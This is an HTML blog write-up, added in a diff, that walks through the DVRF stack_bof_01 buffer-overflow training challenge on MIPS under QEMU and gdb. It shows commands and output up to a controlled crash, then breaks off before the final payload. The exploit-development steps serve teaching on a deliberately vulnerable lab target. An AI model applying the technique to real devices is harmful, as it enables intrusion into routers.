@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Getting Started with Damn Vulnerable Router Firmware (DVRF) v0.1The Damn Vulnerable Router Firmware (DVRF) project by b1ack0wl will help you get a good start in understanding mips. Download the DVRF p">
+<meta name="keywords" content="mips,write-up">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Learning with DVRF">
+<meta property="og:url" content="https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/index.html">
+<meta property="og:site_name" content="HandsOn Security">
+<meta property="og:description" content="Getting Started with Damn Vulnerable Router Firmware (DVRF) v0.1The Damn Vulnerable Router Firmware (DVRF) project by b1ack0wl will help you get a good start in understanding mips. Download the DVRF p">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-06-21T07:12:16.600Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Learning with DVRF">
+<meta name="twitter:description" content="Getting Started with Damn Vulnerable Router Firmware (DVRF) v0.1The Damn Vulnerable Router Firmware (DVRF) project by b1ack0wl will help you get a good start in understanding mips. Download the DVRF p">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Learning with DVRF</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/s34s0n">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/06/14/Coercive-Man-in-the-Middle/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&text=Learning with DVRF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&title=Learning with DVRF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&is_video=false&description=Learning with DVRF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Learning with DVRF&body=Check out this article: https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&title=Learning with DVRF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&title=Learning with DVRF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&title=Learning with DVRF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&title=Learning with DVRF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&name=Learning with DVRF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-Started-with-Damn-Vulnerable-Router-Firmware-DVRF-v0-1"><span class="toc-number">1.</span> <span class="toc-text">Getting Started with Damn Vulnerable Router Firmware (DVRF) v0.1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-Overflow-exploitation-on-MIPS-architecture-emulated-with-QEMU-by-remote-debugging-with-GDB"><span class="toc-number">1.1.</span> <span class="toc-text">Buffer Overflow exploitation on MIPS architecture emulated with QEMU by remote debugging with GDB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.1.</span> <span class="toc-text">Introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Analyse-the-binary"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">1. Analyse the binary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Emulate-the-binary-in-Qemu-virtual-environment"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">2. Emulate the binary in Qemu virtual environment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Remote-debugging-with-gdb-multiarch"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">3. Remote debugging with gdb-multiarch</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Preparing-the-attack"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">4. Preparing the attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Launching-the-exploitation"><span class="toc-number">1.1.1.5.</span> <span class="toc-text">5. Launching the exploitation</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Learning with DVRF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">HandsOn Security</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-06-21T07:00:05.000Z" itemprop="datePublished">2019-06-21</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Tools-Techniques/">Tools & Techniques</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/mips/">mips</a>, <a class="tag-link" href="/tags/write-up/">write-up</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Getting-Started-with-Damn-Vulnerable-Router-Firmware-DVRF-v0-1"><a href="#Getting-Started-with-Damn-Vulnerable-Router-Firmware-DVRF-v0-1" class="headerlink" title="Getting Started with Damn Vulnerable Router Firmware (DVRF) v0.1"></a>Getting Started with Damn Vulnerable Router Firmware (DVRF) v0.1</h1><p>The <a href="https://github.com/praetorian-inc/DVRF" target="_blank" rel="noopener">Damn Vulnerable Router Firmware</a> (DVRF) project by <a href="https://twitter.com/b1ack0wl" target="_blank" rel="noopener">b1ack0wl</a> will help you get a good start in understanding mips.<br></p>
+<p>Download the DVRF project from GitHub:<a href="https://github.com/praetorian-inc/DVRF" target="_blank" rel="noopener">https://github.com/praetorian-inc/DVRF</a>.
+<br><br>To get started you’ll need to do the following <a href="https://github.com/s34s0n/multiarch/tree/master/mips/tools" target="_blank" rel="noopener">Tools</a>.
+<br><br>Open up a Terminal and go to the location with the firmware bin file.<br><br><br>We can use binwalk to check out the firmware to get some light details of the file system contained with the .bin file. Let’s start with the simple examination with the following command. In Terminal, type in:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  DVRF cd Firmware &lt;br/&gt;</span><br><span class="line">➜  Firmware ls -l </span><br><span class="line">total 8432</span><br><span class="line">-rwxrwxrwx 1 s34s0n s34s0n 7754752 Jan  6 15:17 DVRF_v03.bin</span><br><span class="line">-rwxrwxrwx 1 s34s0n s34s0n  874234 Jan  6 15:17 FW_LICENSE_E1550_v1.0.03.002.html</span><br><span class="line">➜  Firmware binwalk DVRF_v03.bin      </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             BIN-Header, board ID: 1550, hardware version: 4702, firmware version: 1.0.0, build date: 2012-02-08</span><br><span class="line">32            0x20            TRX firmware header, little endian, image size: 7753728 bytes, CRC32: 0x436822F6, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x192708, rootfs offset: 0x0</span><br><span class="line">60            0x3C            gzip compressed data, maximum compression, has original file name: "piggy", from Unix, last modified: 2016-03-09 08:08:31</span><br><span class="line">1648424       0x192728        Squashfs filesystem, little endian, non-standard signature, version 3.0, size: 6099215 bytes, 447 inodes, blocksize: 65536 bytes, created: 2016-03-10 04:34:22</span><br></pre></td></tr></table></figure>
+
+<p>From here we can see that there is a Squash file system and that little endian is used for the byte order.<br><br><br>Let’s extract the firmware to further explore the data within. In Terminal, type in:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk -eM DVRF_v03.bin</span></span><br></pre></td></tr></table></figure>
+
+<p>When we do the extraction we can see the same first section as above showing the different parts of the firmware. The second section is new and shows information about the underlying Linux filesystem within the firmware.</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Scan Time:     20xx-xx-xx xx:xx:xx</span><br><span class="line">Target File:   /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/piggy</span><br><span class="line">MD5 Checksum:  1fab89cd8929471441d4130a1c2cf477</span><br><span class="line">Signatures:    386</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">3076096       0x2EF000        Linux kernel version 2.6.22</span><br><span class="line">3108912       0x2F7030        CRC32 polynomial table, little endian</span><br><span class="line">3123228       0x2FA81C        CRC32 polynomial table, little endian</span><br><span class="line">3319864       0x32A838        Unix path: /usr/gnemul/irix/</span><br><span class="line">3322560       0x32B2C0        Unix path: /usr/lib/libc.so.1</span><br><span class="line">3422799       0x343A4F        Neighborly text, "NeighborSolicitsts"</span><br><span class="line">3422823       0x343A67        Neighborly text, "NeighborAdvertisementsmp6OutDestUnreachs"</span><br><span class="line">3423024       0x343B30        Neighborly text, "NeighborSolicitsirects"</span><br><span class="line">3423052       0x343B4C        Neighborly text, "NeighborAdvertisementssponses"</span><br><span class="line">3425755       0x3445DB        Neighborly text, "neighbor %.2x%.2x.%.2x:%.2x:%.2x:%.2x:%.2x:%.2x lost on port %d(%s)(%s)"</span><br></pre></td></tr></table></figure>
+
+<p>An additional folder has been created in the same directory which contains the extracted contents. Within this new folder, we see the “squashfs-root” folder representing the file system of the firmware. Within this folder, we can see a folder called “pwnable” which have the specific DVRF challenges that we need to solve.</p>
+<h2 id="Buffer-Overflow-exploitation-on-MIPS-architecture-emulated-with-QEMU-by-remote-debugging-with-GDB"><a href="#Buffer-Overflow-exploitation-on-MIPS-architecture-emulated-with-QEMU-by-remote-debugging-with-GDB" class="headerlink" title="Buffer Overflow exploitation on MIPS architecture emulated with QEMU by remote debugging with GDB"></a>Buffer Overflow exploitation on MIPS architecture emulated with QEMU by remote debugging with GDB</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>This exercise is based on stack_bof_01 (belonging to DVRF). In this case we will try to exploit the Buffer Overflow vulnerability present on the file, due to the usage of the <strong>strcpy</strong> function. The executable <strong>stack_bof_01</strong> is intended for a MIPS architecture, and it is emulated with <strong>qemu-mipsel</strong> by enabling <strong>chroot</strong> command.</p>
+<h4 id="1-Analyse-the-binary"><a href="#1-Analyse-the-binary" class="headerlink" title="1. Analyse the binary"></a>1. Analyse the binary</h4><p>The readme file in the “Intro” directory has specific information about the various challenges that will be solved. Check this file over to see hints about each challenge.<br><br>Now that we know for sure that the underlying byte system is “little endian” from earlier analysis with binwalk, we can check to see if the files are of a MIPS architecture. Open up Terminal and browse to the pwnable directory.</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  DVRF cd Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro </span><br><span class="line">➜  Intro ls -l</span><br><span class="line">total 28</span><br><span class="line">-rwxr-xr-x 1 s34s0n s34s0n 7125 Mar 10  2016 heap_overflow_01</span><br><span class="line">-rwxr-xr-x 1 s34s0n s34s0n 1999 Mar 10  2016 README</span><br><span class="line">-rwxr-xr-x 1 s34s0n s34s0n 7016 Mar 10  2016 stack_bof_01</span><br><span class="line">-rwxr-xr-x 1 s34s0n s34s0n 7218 Mar 10  2016 uaf_01</span><br></pre></td></tr></table></figure>
+
+<p>To get the specific information about the file, we can use the “file” command. Let’s try this on the stack overflow challenge file. In Terminal, type in:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file stack_bof_01</span></span><br></pre></td></tr></table></figure>
+
+<p>Here we can see a few interesting pieces of information about this file system and specific architecture information. To verify little endian, we can see the “LSB executable” which stands for least significant byte indicating little endian. We can see the MIPS architecture with the 32-bit version of MIPS. We can also see that the uClibc C library is used.</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  Intro file stack_bof_01 </span><br><span class="line">stack_bof_01: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>With the information above, we can go into the next step.</p>
+<h4 id="2-Emulate-the-binary-in-Qemu-virtual-environment"><a href="#2-Emulate-the-binary-in-Qemu-virtual-environment" class="headerlink" title="2. Emulate the binary in Qemu virtual environment"></a>2. Emulate the binary in Qemu virtual environment</h4><p>Now let’s go back to the <strong>squashfs-root</strong> directory. We need to copy over the appropriate version of Qemu to run the challenges. To do this, we’re going to copy Qemu to the firmware root directory. In Terminal, type in:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp $(<span class="built_in">which</span> qemu-mipsel-static) ./</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  squashfs-root cp $(which qemu-mipsel-static) ./</span><br><span class="line">➜  squashfs-root ls -l</span><br><span class="line">total 3420</span><br><span class="line">drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 bin</span><br><span class="line">drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 dev</span><br><span class="line">drwxr-xr-x 3 s34s0n s34s0n    4096 Mar 10  2016 etc</span><br><span class="line">drwxr-xr-x 3 s34s0n s34s0n    4096 Mar 10  2016 lib</span><br><span class="line">lrwxrwxrwx 1 s34s0n s34s0n       9 Jan 23 18:40 media -&gt; tmp/media</span><br><span class="line">drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 mnt</span><br><span class="line">drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 proc</span><br><span class="line">drwxr-xr-x 4 s34s0n s34s0n    4096 Mar 10  2016 pwnable</span><br><span class="line">-rwxr-xr-x 1 s34s0n s34s0n 3451752 Jan 23 20:25 qemu-mipsel-static</span><br><span class="line">drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 sbin</span><br><span class="line">drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 sys</span><br><span class="line">drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 tmp</span><br><span class="line">drwxr-xr-x 6 s34s0n s34s0n    4096 Mar 10  2016 usr</span><br><span class="line">lrwxrwxrwx 1 s34s0n s34s0n       7 Jan 23 18:40 var -&gt; tmp/var</span><br><span class="line">drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 www</span><br></pre></td></tr></table></figure>
+
+<p>Let’s verify that we can run the challenges with Qemu. We will run the challenge in a “chroot” to contain the challenge. In Terminal, type in:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 test123</span></span><br></pre></td></tr></table></figure>
+
+<p> You should see the wrong input that will show the failed message from the challenge.</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  squashfs-root sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 test123</span><br><span class="line">Welcome to the first BoF exercise!</span><br><span class="line"></span><br><span class="line">You entered test123 </span><br><span class="line">Try Again</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-Remote-debugging-with-gdb-multiarch"><a href="#3-Remote-debugging-with-gdb-multiarch" class="headerlink" title="3. Remote debugging with gdb-multiarch"></a>3. Remote debugging with gdb-multiarch</h4><p>The program is emulated again, now with the parameter AAAA and the option “-g 1234”, meaning that the file is going to be debugged remotely at port 1234:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 AAAA</span></span><br></pre></td></tr></table></figure>
+
+<p>Open up another terminal and run the debugger <strong>gdb-multiarch</strong> in a quiet mode (-q):</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gdb-multiarch ./pwnable/Intro/stack_bof_01 -q</span></span><br><span class="line">Reading symbols from ./pwnable/Intro/stack_bof_01...(no debugging symbols found)...done.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+
+<p>Setting the architecture option for MIPS:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) set architecture mips</span><br><span class="line">The target architecture is assumed to be mips</span><br></pre></td></tr></table></figure>
+
+<p>The remote target will be the Qemu instance launched before, that is running locally at the port 1234:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) target remote 127.0.0.1:1234</span><br><span class="line">Remote debugging using 127.0.0.1:1234</span><br><span class="line">warning: remote target does not support file transfer, attempting to access files from local filesystem.</span><br><span class="line">Reading symbols from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...done.</span><br><span class="line">0x7f7b9a80 in _start ()</span><br><span class="line">   from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+
+<p>Continuing the execution:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[Inferior 1 (Remote target) exited with code 0101]</span><br></pre></td></tr></table></figure>
+
+<p>The usual output is displayed</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 AAAA</span></span><br><span class="line">[sudo] password for s34s0n: </span><br><span class="line">Welcome to the first BoF exercise!</span><br><span class="line"></span><br><span class="line">You entered AAAA </span><br><span class="line">Try Again</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-Preparing-the-attack"><a href="#4-Preparing-the-attack" class="headerlink" title="4. Preparing the attack"></a>4. Preparing the attack</h4><p>Now, in order to prepare the attack, let’s examine the functions of the binary. Specifically, because we are interested to control the flow of the program to execute the function dat_shell, let’s notice that this function starts at 0x004000950:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info functions </span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0040059c  _init</span><br><span class="line">0x00400630  __start</span><br><span class="line">0x00400630  _ftext</span><br><span class="line">0x00400690  __do_global_dtors_aux</span><br><span class="line">0x00400748  frame_dummy</span><br><span class="line">0x004007e0  main</span><br><span class="line">0x00400950  dat_shell</span><br><span class="line">0x004009d0  __do_global_ctors_aux</span><br><span class="line">0x00400a30  strcpy</span><br><span class="line">0x00400a40  printf</span><br><span class="line">0x00400a50  puts</span><br><span class="line">0x00400a60  system</span><br><span class="line">0x00400a70  __uClibc_main</span><br><span class="line">0x00400a80  memset</span><br><span class="line">0x00400a90  exit</span><br></pre></td></tr></table></figure>
+
+<p>Also -</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print dat_shell </span><br><span class="line"><span class="meta">$</span><span class="bash">1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x400950 &lt;dat_shell&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>In order to overwrite the buffer, let’s use a pattern of 300 characters generated by a Perl script like this:<br><br><a href="https://securitythoughts.wordpress.com/2010/03/18/tool-unique-pattern-generator-for-exploit-development/" target="_blank" rel="noopener">https://securitythoughts.wordpress.com/2010/03/18/tool-unique-pattern-generator-for-exploit-development/</a></p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./pattern.pl 300</span></span><br><span class="line"></span><br><span class="line">Generate/Search Pattern </span><br><span class="line">Scripted by Wasim Halani (washal)</span><br><span class="line">https://securitythoughts.wordpress.com/</span><br><span class="line">Version 0.2</span><br><span class="line"></span><br><span class="line">String is : </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure>
+
+<p>Copying the pattern, and pasting it as a parameter to the program:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span></span><br></pre></td></tr></table></figure>
+
+<p>Debugging again and continuing the execution, there is a segmentation fault at 0x41386740, a non executable area of memory:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) target remote 127.0.0.1:1234</span><br><span class="line">Remote debugging using 127.0.0.1:1234</span><br><span class="line">Reading symbols from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...done.</span><br><span class="line">0x7f7b9a80 in _start ()</span><br><span class="line">   from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x41386741 in ?? ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+
+<p>As before, the usual message is displayed:</p>
